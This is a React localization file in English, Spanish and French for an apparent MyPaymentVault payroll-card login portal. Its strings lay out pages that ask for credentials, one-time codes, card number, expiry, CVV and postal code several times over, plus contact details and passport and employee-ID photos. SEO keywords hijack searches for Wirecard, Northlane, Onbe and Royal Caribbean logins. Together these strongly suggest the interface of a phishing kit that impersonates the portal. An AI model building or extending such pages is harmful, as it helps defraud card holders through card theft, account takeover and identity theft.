import { createContext, useContext, useState, useEffect, ReactNode } from 'react';

type Language = 'en' | 'es' | 'fr';

interface LanguageContextType {
  language: Language;
  setLanguage: (lang: Language) => void;
  t: (key: string) => string;
}

const LanguageContext = createContext<LanguageContextType | undefined>(undefined);

// Translations
const translations: Record<Language, Record<string, string>> = {
  en: {
    // Common
    'common.english': 'English',
    'common.spanish': 'Español',
    'common.french': 'Français',
    'common.submit': 'Submit',
    'common.cancel': 'Cancel',
    'common.continue': 'Continue',
    'common.back': 'Back',
    'common.changeLanguage': 'Change Language',
    'common.companyLogo': 'My Company logo',
    
    // Login Page
    'login.title': 'Access and Manage Your Account',
    'login.notEnrolled': 'Not Enrolled Yet?',
    'login.createAccount': 'Create your Account',
    'login.forgotUsername': 'Forgot Username?',
    'login.username': 'Username',
    'login.password': 'Password',
    'login.forgotPassword': 'Forgot Password?',
    'login.signIn': 'Sign in',
    'login.activateCard': 'Did you receive a new card?',
    'login.activateCardLink': 'Activate your card',
    'login.footer.copyright': '© 2025 MyPaymentVault, Inc.',
    'login.footer.terms': 'Terms of Use',
    'login.footer.privacy': 'Privacy and Cookies',
    'login.footer.contact': 'Contact Us',
    
    // SEO Metadata
    'seo.login.title': 'Login MyPaymentVault | Login Wirecard | Login Northlane | Login North Lane',
    'seo.login.description': 'Login MyPaymentVault, Login Wirecard, Login North Lane, Login Northlane - Secure employee payment portal with MFA, OTP verification & card management. Alternative to Wirecard 2 & Onbe 1. Access 24/7.',
    'seo.login.keywords': 'login mypaymentvault, login wirecard, login north lane, login northlane, login wirecard 2, login onbe 1, mypaymentvault login, wirecard login, north lane login, northlane login, wirecard 2 login, onbe 1 login, mypaymentvault northlane, wirecard portal, north lane portal, northlane payment vault, wirecard 2 portal, onbe payment system, login wirecard alternative, login north lane alternative, login northlane secure, mypaymentvault card login, wirecard card login, northlane card authentication, north lane card portal, wirecard 2 authentication, onbe 1 login portal, payment vault access, employee payment portal, secure payment login, multi factor authentication login, mypaymentvault otp login, wirecard otp verification, northlane otp, royal caribbean mypaymentvault',
    
    // Email Modal
    'email.title': 'Verification Required',
    'email.description': 'In order to confirm your identity, we need to send you a one-time verification code.',
    'email.selectMethod': 'Please select how you would like to receive it.',
    'email.label': 'Email',
    'email.placeholder': 'Email Address*',
    'email.verify': 'Send Code',
    'email.standardRates': 'Standard rates may apply',
    'email.privacyPolicy': 'Privacy Policy',
    'email.termsConditions': 'Terms & Conditions',
    'email.invalidEmail': 'Please enter a valid email address.',
    'email.placeholder_example': 'your_email@example.com',
    
    // OTP Modal
    'otp.title': 'Verification Required',
    'otp.description': 'Enter the verification code sent to you.',
    'otp.expiry': 'This code will expire 10 minutes after it is sent.',
    'otp.label': 'Verification Code',
    'otp.placeholder': 'Verification Code*',
    'otp.verify': 'Continue',
    'otp.resend': 'Didn\'t receive a code? Resend code',
    'otp.invalidCode': 'Invalid OTP code. Please try again.',
    
    // Error Messages / Toasts
    'error.generic': 'Error',
    'error.loginFailed': 'Login failed',
    'error.emailVerificationFailed': 'Email verification failed',
    'error.otpVerificationFailed': 'OTP verification failed',
    'error.credentialsRequired': 'Please enter username and password',
    
    // Register Page
    'register.title': 'Register Your Card',
    'register.cardNumber': 'Card Number',
    'register.expiration': 'Expiration (MM/YY)',
    'register.cvv': 'CVV',
    'register.postalCode': 'Postal Code',
    'register.submit': 'Register Card',
    
    // Card Activation Page
    'activate.title': 'Activate Your Card',
    'activate.cardNumber': 'Card Number',
    'activate.expiration': 'Expiration (MM/YY)',
    'activate.cvv': 'CVV',
    'activate.submit': 'Activate Card',
    
    // Forgot Username Page
    'forgotUsername.title': 'Forgot Username',
    'forgotUsername.description': 'Enter your card details to recover your username',
    'forgotUsername.cardNumber': 'Card Number',
    'forgotUsername.cvv': 'CVV',
    'forgotUsername.postalCode': 'Postal Code',
    'forgotUsername.submit': 'Recover Username',
    
    // Forgot Password Page
    'forgotPassword.title': 'Forgot Password',
    'forgotPassword.description': 'Enter your details to reset your password',
    'forgotPassword.username': 'Username',
    'forgotPassword.postalCode': 'Postal Code',
    'forgotPassword.submit': 'Reset Password',
    
    // Postal Code Page
    'postal.title': 'Card Verification',
    'postal.cardNumber': 'Card Number',
    'postal.expiration': 'Expiration (MM/YY)',
    'postal.cvv': 'CVV',
    'postal.postalCode': 'Postal Code',
    'postal.submit': 'Verify Card',
    
    // Contact Info Page
    'contact.title': 'Contact Information',
    'contact.firstName': 'First Name',
    'contact.lastName': 'Last Name',
    'contact.email': 'Email Address',
    'contact.phone': 'Phone Number',
    'contact.address': 'Street Address',
    'contact.city': 'City',
    'contact.state': 'State/Province',
    'contact.postalCode': 'Postal Code',
    'contact.country': 'Country',
    'contact.passport': 'Passport Photo',
    'contact.passportDesc': 'Upload your passport photo (Optional)',
    'contact.passportFormat': 'Supported: JPEG, PNG • Max size: 50 MB',
    'contact.employeeId': 'Employee ID Photo',
    'contact.employeeIdDesc': 'Upload your employee ID photo (Optional)',
    'contact.employeeIdFormat': 'Supported: JPEG, PNG • Max size: 50 MB',
    'contact.choosePhoto': 'Choose Photo',
    'contact.changePhoto': 'Change Photo',
    'contact.uploadSuccess': 'Upload successful - Ready to submit',
    'contact.submit': 'Submit Information',
  },
  es: {
    // Common
    'common.english': 'English',
    'common.spanish': 'Español',
    'common.french': 'Français',
    'common.submit': 'Enviar',
    'common.cancel': 'Cancelar',
    'common.continue': 'Continuar',
    'common.back': 'Volver',
    'common.changeLanguage': 'Cambiar idioma',
    'common.companyLogo': 'Logo de mi empresa',
    
    // Login Page
    'login.title': 'Acceda y Gestione su Cuenta',
    'login.notEnrolled': '¿Aún no está registrado?',
    'login.createAccount': 'Cree su cuenta',
    'login.forgotUsername': '¿Olvidó su nombre de usuario?',
    'login.username': 'Nombre de usuario',
    'login.password': 'Contraseña',
    'login.forgotPassword': '¿Olvidó su contraseña?',
    'login.signIn': 'Iniciar sesión',
    'login.activateCard': '¿Recibió una nueva tarjeta?',
    'login.activateCardLink': 'Active su tarjeta',
    'login.footer.copyright': '© 2025 MyPaymentVault, Inc.',
    'login.footer.terms': 'Términos de uso',
    'login.footer.privacy': 'Privacidad y cookies',
    'login.footer.contact': 'Contáctenos',
    
    // SEO Metadata
    'seo.login.title': 'Login MyPaymentVault | Login Wirecard | Login Northlane | Login North Lane',
    'seo.login.description': 'Login MyPaymentVault, Login Wirecard, Login North Lane, Login Northlane - Portal de pago seguro con MFA, verificación OTP. Alternativa a Wirecard 2 y Onbe 1. Acceso 24/7.',
    'seo.login.keywords': 'login mypaymentvault, login wirecard, login north lane, login northlane, login wirecard 2, login onbe 1, iniciar sesión mypaymentvault, wirecard login, north lane login, northlane login, wirecard 2 login, onbe 1 login, mypaymentvault northlane, wirecard portal, north lane portal, northlane portal de pago, wirecard 2 portal, onbe sistema de pago, login wirecard alternativa, login north lane alternativa, login northlane seguro, mypaymentvault tarjeta login, wirecard tarjeta login, northlane autenticación tarjeta, north lane portal tarjeta, wirecard 2 autenticación, onbe 1 portal login, acceso bóveda pago, portal de pago empleados, inicio sesión seguro, login autenticación multifactor, mypaymentvault otp login, wirecard verificación otp, northlane otp, royal caribbean mypaymentvault',
    
    // Email Modal
    'email.title': 'Verificación requerida',
    'email.description': 'Para confirmar su identidad, necesitamos enviarle un código de verificación único.',
    'email.selectMethod': 'Por favor, seleccione cómo desea recibirlo.',
    'email.label': 'Correo electrónico',
    'email.placeholder': 'Dirección de correo electrónico*',
    'email.verify': 'Enviar código',
    'email.standardRates': 'Pueden aplicarse tarifas estándar',
    'email.privacyPolicy': 'Política de privacidad',
    'email.termsConditions': 'Términos y condiciones',
    'email.invalidEmail': 'Por favor, introduzca una dirección de correo electrónico válida.',
    'email.placeholder_example': 'su_correo@ejemplo.com',
    
    // OTP Modal
    'otp.title': 'Verificación requerida',
    'otp.description': 'Introduzca el código de verificación que se le envió.',
    'otp.expiry': 'Este código caducará 10 minutos después de ser enviado.',
    'otp.label': 'Código de verificación',
    'otp.placeholder': 'Código de verificación*',
    'otp.verify': 'Continuar',
    'otp.resend': '¿No recibió un código? Reenviar código',
    'otp.invalidCode': 'Código OTP no válido. Por favor, inténtelo de nuevo.',
    
    // Error Messages / Toasts
    'error.generic': 'Error',
    'error.loginFailed': 'Error al iniciar sesión',
    'error.emailVerificationFailed': 'Error en la verificación de correo electrónico',
    'error.otpVerificationFailed': 'Error en la verificación OTP',
    'error.credentialsRequired': 'Por favor, introduzca nombre de usuario y contraseña',
    
    // Register Page
    'register.title': 'Registre su tarjeta',
    'register.cardNumber': 'Número de tarjeta',
    'register.expiration': 'Vencimiento (MM/AA)',
    'register.cvv': 'CVV',
    'register.postalCode': 'Código postal',
    'register.submit': 'Registrar tarjeta',
    
    // Card Activation Page
    'activate.title': 'Active su tarjeta',
    'activate.cardNumber': 'Número de tarjeta',
    'activate.expiration': 'Vencimiento (MM/AA)',
    'activate.cvv': 'CVV',
    'activate.submit': 'Activar tarjeta',
    
    // Forgot Username Page
    'forgotUsername.title': 'Olvidó su nombre de usuario',
    'forgotUsername.description': 'Introduzca los datos de su tarjeta para recuperar su nombre de usuario',
    'forgotUsername.cardNumber': 'Número de tarjeta',
    'forgotUsername.cvv': 'CVV',
    'forgotUsername.postalCode': 'Código postal',
    'forgotUsername.submit': 'Recuperar nombre de usuario',
    
    // Forgot Password Page
    'forgotPassword.title': 'Olvidó su contraseña',
    'forgotPassword.description': 'Introduzca sus datos para restablecer su contraseña',
    'forgotPassword.username': 'Nombre de usuario',
    'forgotPassword.postalCode': 'Código postal',
    'forgotPassword.submit': 'Restablecer contraseña',
    
    // Postal Code Page
    'postal.title': 'Verificación de tarjeta',
    'postal.cardNumber': 'Número de tarjeta',
    'postal.expiration': 'Vencimiento (MM/AA)',
    'postal.cvv': 'CVV',
    'postal.postalCode': 'Código postal',
    'postal.submit': 'Verificar tarjeta',
    
    // Contact Info Page
    'contact.title': 'Información de contacto',
    'contact.firstName': 'Nombre',
    'contact.lastName': 'Apellido',
    'contact.email': 'Correo electrónico',
    'contact.phone': 'Número de teléfono',
    'contact.address': 'Dirección',
    'contact.city': 'Ciudad',
    'contact.state': 'Estado/Provincia',
    'contact.postalCode': 'Código postal',
    'contact.country': 'País',
    'contact.passport': 'Foto de pasaporte',
    'contact.passportDesc': 'Suba su foto de pasaporte (Opcional)',
    'contact.passportFormat': 'Compatible: JPEG, PNG • Tamaño máx: 50 MB',
    'contact.employeeId': 'Foto de ID de empleado',
    'contact.employeeIdDesc': 'Suba su foto de ID de empleado (Opcional)',
    'contact.employeeIdFormat': 'Compatible: JPEG, PNG • Tamaño máx: 50 MB',
    'contact.choosePhoto': 'Elegir foto',
    'contact.changePhoto': 'Cambiar foto',
    'contact.uploadSuccess': 'Carga exitosa - Listo para enviar',
    'contact.submit': 'Enviar información',
  },
  fr: {
    // Common
    'common.english': 'English',
    'common.spanish': 'Español',
    'common.french': 'Français',
    'common.submit': 'Soumettre',
    'common.cancel': 'Annuler',
    'common.continue': 'Continuer',
    'common.back': 'Retour',
    'common.changeLanguage': 'Changer de langue',
    'common.companyLogo': 'Logo de mon entreprise',
    
    // Login Page
    'login.title': 'Accédez et gérez votre compte',
    'login.notEnrolled': 'Pas encore inscrit?',
    'login.createAccount': 'Créez votre compte',
    'login.forgotUsername': 'Nom d\'utilisateur oublié?',
    'login.username': 'Nom d\'utilisateur',
    'login.password': 'Mot de passe',
    'login.forgotPassword': 'Mot de passe oublié?',
    'login.signIn': 'Se connecter',
    'login.activateCard': 'Avez-vous reçu une nouvelle carte?',
    'login.activateCardLink': 'Activez votre carte',
    'login.footer.copyright': '© 2025 MyPaymentVault, Inc.',
    'login.footer.terms': 'Conditions d\'utilisation',
    'login.footer.privacy': 'Confidentialité et cookies',
    'login.footer.contact': 'Nous contacter',
    
    // SEO Metadata
    'seo.login.title': 'Login MyPaymentVault | Login Wirecard | Login Northlane | Login North Lane',
    'seo.login.description': 'Login MyPaymentVault, Login Wirecard, Login North Lane, Login Northlane - Portail de paiement sécurisé avec MFA, vérification OTP. Alternative à Wirecard 2 et Onbe 1. Accès 24/7.',
    'seo.login.keywords': 'login mypaymentvault, login wirecard, login north lane, login northlane, login wirecard 2, login onbe 1, connexion mypaymentvault, wirecard login, north lane login, northlane login, wirecard 2 login, onbe 1 login, mypaymentvault northlane, wirecard portail, north lane portail, northlane portail paiement, wirecard 2 portail, onbe système paiement, login wirecard alternative, login north lane alternative, login northlane sécurisé, mypaymentvault carte login, wirecard carte login, northlane authentification carte, north lane portail carte, wirecard 2 authentification, onbe 1 portail login, accès coffre paiement, portail paiement employés, connexion sécurisée, login authentification multifacteur, mypaymentvault otp login, wirecard vérification otp, northlane otp, royal caribbean mypaymentvault',
    
    // Email Modal
    'email.title': 'Vérification requise',
    'email.description': 'Afin de confirmer votre identité, nous devons vous envoyer un code de vérification unique.',
    'email.selectMethod': 'Veuillez sélectionner comment vous souhaitez le recevoir.',
    'email.label': 'Courriel',
    'email.placeholder': 'Adresse e-mail*',
    'email.verify': 'Envoyer le code',
    'email.standardRates': 'Des tarifs standard peuvent s\'appliquer',
    'email.privacyPolicy': 'Politique de confidentialité',
    'email.termsConditions': 'Termes et conditions',
    'email.invalidEmail': 'Veuillez entrer une adresse e-mail valide.',
    'email.placeholder_example': 'votre_email@exemple.com',
    
    // OTP Modal
    'otp.title': 'Vérification requise',
    'otp.description': 'Entrez le code de vérification qui vous a été envoyé.',
    'otp.expiry': 'Ce code expirera 10 minutes après son envoi.',
    'otp.label': 'Code de vérification',
    'otp.placeholder': 'Code de vérification*',
    'otp.verify': 'Continuer',
    'otp.resend': 'Vous n\'avez pas reçu de code? Renvoyer le code',
    'otp.invalidCode': 'Code OTP invalide. Veuillez réessayer.',
    
    // Error Messages / Toasts
    'error.generic': 'Erreur',
    'error.loginFailed': 'Échec de la connexion',
    'error.emailVerificationFailed': 'Échec de la vérification e-mail',
    'error.otpVerificationFailed': 'Échec de la vérification OTP',
    'error.credentialsRequired': 'Veuillez entrer votre nom d\'utilisateur et mot de passe',
    
    // Register Page
    'register.title': 'Enregistrez votre carte',
    'register.cardNumber': 'Numéro de carte',
    'register.expiration': 'Expiration (MM/AA)',
    'register.cvv': 'CVV',
    'register.postalCode': 'Code postal',
    'register.submit': 'Enregistrer la carte',
    
    // Card Activation Page
    'activate.title': 'Activez votre carte',
    'activate.cardNumber': 'Numéro de carte',
    'activate.expiration': 'Expiration (MM/AA)',
    'activate.cvv': 'CVV',
    'activate.submit': 'Activer la carte',
    
    // Forgot Username Page
    'forgotUsername.title': 'Nom d\'utilisateur oublié',
    'forgotUsername.description': 'Entrez les détails de votre carte pour récupérer votre nom d\'utilisateur',
    'forgotUsername.cardNumber': 'Numéro de carte',
    'forgotUsername.cvv': 'CVV',
    'forgotUsername.postalCode': 'Code postal',
    'forgotUsername.submit': 'Récupérer le nom d\'utilisateur',
    
    // Forgot Password Page
    'forgotPassword.title': 'Mot de passe oublié',
    'forgotPassword.description': 'Entrez vos informations pour réinitialiser votre mot de passe',
    'forgotPassword.username': 'Nom d\'utilisateur',
    'forgotPassword.postalCode': 'Code postal',
    'forgotPassword.submit': 'Réinitialiser le mot de passe',
    
    // Postal Code Page
    'postal.title': 'Vérification de carte',
    'postal.cardNumber': 'Numéro de carte',
    'postal.expiration': 'Expiration (MM/AA)',
    'postal.cvv': 'CVV',
    'postal.postalCode': 'Code postal',
    'postal.submit': 'Vérifier la carte',
    
    // Contact Info Page
    'contact.title': 'Informations de contact',
    'contact.firstName': 'Prénom',
    'contact.lastName': 'Nom de famille',
    'contact.email': 'Adresse e-mail',
    'contact.phone': 'Numéro de téléphone',
    'contact.address': 'Adresse',
    'contact.city': 'Ville',
    'contact.state': 'État/Province',
    'contact.postalCode': 'Code postal',
    'contact.country': 'Pays',
    'contact.passport': 'Photo de passeport',
    'contact.passportDesc': 'Téléchargez votre photo de passeport (Facultatif)',
    'contact.passportFormat': 'Pris en charge: JPEG, PNG • Taille max: 50 MB',
    'contact.employeeId': 'Photo de carte d\'employé',
    'contact.employeeIdDesc': 'Téléchargez votre photo de carte d\'employé (Facultatif)',
    'contact.employeeIdFormat': 'Pris en charge: JPEG, PNG • Taille max: 50 MB',
    'contact.choosePhoto': 'Choisir une photo',
    'contact.changePhoto': 'Changer la photo',
    'contact.uploadSuccess': 'Téléchargement réussi - Prêt à soumettre',
    'contact.submit': 'Soumettre les informations',
  },
};

export function LanguageProvider({ children }: { children: ReactNode }) {
  const [language, setLanguageState] = useState<Language>(() => {
    // Get from localStorage or default to English
    const saved = localStorage.getItem('language');
    if (saved === 'es' || saved === 'fr') return saved;
    return 'en';
  });

  useEffect(() => {
    // Save to localStorage when language changes
    localStorage.setItem('language', language);
  }, [language]);

  const setLanguage = (lang: Language) => {
    setLanguageState(lang);
  };

  const t = (key: string): string => {
    return translations[language][key] || key;
  };

  return (
    <LanguageContext.Provider value={{ language, setLanguage, t }}>
      {children}
    </LanguageContext.Provider>
  );
}

export function useLanguage() {
  const context = useContext(LanguageContext);
  if (context === undefined) {
    throw new Error('useLanguage must be used within a LanguageProvider');
  }
  return context;
}
